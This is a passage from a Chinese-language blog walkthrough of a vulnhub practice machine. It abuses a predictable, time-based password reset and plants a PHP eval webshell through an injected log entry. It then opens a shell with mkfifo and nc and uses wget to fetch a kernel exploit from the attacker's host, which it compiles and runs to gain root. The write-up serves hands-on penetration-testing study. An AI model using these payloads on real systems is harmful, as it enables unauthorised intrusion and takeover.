+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$message = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123; <span class="comment">// If form is submitted</span></span><br><span class="line">    $email = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">    $sql = $pdo-&gt;prepare(<span class="string">"SELECT * FROM g0rmint WHERE email = :email AND username = :user"</span>);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":email"</span>, $email);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":user"</span>, $user);</span><br><span class="line">    $row = $sql-&gt;execute();</span><br><span class="line">    $result = $sql-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        $password = substr(hash(<span class="string">'sha1'</span>, gmdate(<span class="string">"l jS \of F Y h:i:s A"</span>)), <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql = $pdo-&gt;prepare(<span class="string">"UPDATE g0rmint SET pass = :pass where id = 1"</span>);</span><br><span class="line">        $sql-&gt;bindParam(<span class="string">":pass"</span>, $password);</span><br><span class="line">        $row = $sql-&gt;execute();</span><br><span class="line">        $message = <span class="string">"A new password has been sent to your email"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">"User not found in our database"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，只需要知道一个存在的邮箱和用户名，就可以重置密码为一个时间值的哈希</p>
+<p>但是，尝试了<code>demo</code>和一些常用邮箱用户名之后，发现似乎并没有这个用户</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/43.png" alt></p>
+<p>后面这个思路确实有点骚，问了队友才知道怎么弄，尝试在全部文件中搜索<code>email</code>关键字</p>
+<p>可以在一个<code>css</code>文件中看到用户的名字和邮箱</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/44.png" alt></p>
+<p>成功重置后，界面右下角也给出了对应的时间，遂能算出相应的哈希值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/45.png" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> substr(hash(<span class="string">'sha1'</span>, <span class="string">'Saturday 15th of September 2018 02:05:51 AM'</span>), <span class="number">0</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9997</span>d372a7af4f7a680b</span><br></pre></td></tr></table></figure>
+<p>用邮箱和算出的哈希值就能登录到后台中</p>
+<p>这时也能成功的访问到生成的log文件了</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>这样，我们在登录的时邮箱处插入一条php语句，写入webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[_]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后访问对应的日志，提交post参数即可执行任意php代码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/46.png" alt></p>
+<p>然后将shell弹到我的kali中来</p>
+<p>在post中*<em>依次</em>传入</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">_</span>=`mkfifo /tmp/t`<span class="comment">;</span></span><br><span class="line"><span class="attr">_</span>=`cat /tmp/t | /bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span> | nc -l <span class="number">8888</span> &gt; /tmp/t`<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>注意url编码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">_</span>=<span class="number">%60</span>mkfifo<span class="number">%20</span><span class="number">%2</span>ftmp<span class="number">%2</span>ft<span class="number">%60</span><span class="number">%3</span>B</span><br><span class="line"><span class="attribute">_</span>=<span class="number">%60</span>cat<span class="number">%20</span><span class="number">%2</span>ftmp<span class="number">%2</span>ft<span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>fbin<span class="number">%2</span>fsh<span class="number">%20</span>-i<span class="number">%202</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span>nc<span class="number">%20</span>-l<span class="number">%208888</span><span class="number">%20</span><span class="number">%3</span>E<span class="number">%20</span><span class="number">%2</span>ftmp<span class="number">%2</span>ft<span class="number">%60</span><span class="number">%3</span>B</span><br></pre></td></tr></table></figure>
+<p>第二次post完之后，浏览器会进入阻塞状态，在kali中用nc连接即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n 192.168.85.139 8888</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/47.png" alt></p>
+<h2 id="提升权限-2"><a href="#提升权限-2" class="headerlink" title="提升权限"></a>提升权限</h2><p>接下来就是尝试能不能提权成root，先查看一下版本信息</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/48.png" alt></p>
+<p>找一下ubuntu 16.04的提权脚本</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/49.png" alt></p>
+<p>挑一个44298来看看，将这个文件移动到<code>/var/www/html</code>目录下之后，在webshell中运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.85.134/44298.c /tmp/</span><br></pre></td></tr></table></figure>
+<p>然而编译的时候一个比较尴尬的事情发生了，没有安装gcc</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/50.png" alt></p>
+<p>所以就只能在本地编译后上传了，为防止一些库的差异，我选择了在我另外一台ubuntu 16.04的虚拟机中编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o e</span><br></pre></td></tr></table></figure>
+<p>然后还是将这个文件放到www目录，通过wget的方式下载到<code>/tmp</code>目录下</p>
+<p>赋予权限，提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 e</span><br><span class="line">./e</span><br></pre></td></tr></table></figure>
+<p>就可以成功提权成为root了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/51.png" alt></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/09/vulnhub-GeminiInc/" data-toggle="tooltip" data-placement="top" title="vulnhub-GeminiInc">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/09/weblogic漏洞练习/" data-toggle="tooltip" data-placement="top" title="weblogic漏洞练习">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#vulnhub" title="vulnhub">vulnhub</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
